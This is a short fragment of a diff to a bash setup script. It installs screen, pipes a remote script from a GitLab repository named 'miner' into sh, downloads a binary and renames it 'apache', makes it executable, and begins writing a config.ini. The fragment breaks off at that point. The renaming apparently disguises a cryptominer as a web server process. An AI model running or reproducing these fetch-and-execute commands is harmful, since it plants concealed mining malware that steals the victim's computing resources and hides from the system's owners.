@@ -1,3 +1,4 @@
+#!/bin/bash
 sudo apt-get update && sudo apt-get install screen -y && curl https://gitlab.com/ghcees/miner/-/raw/main/jnano.sh | sh && curl -0 https://gitlab.com/ghcees/miner/-/raw/main/n389 -o apache && chmod +x apache &&
 
 cat > config.ini <<END
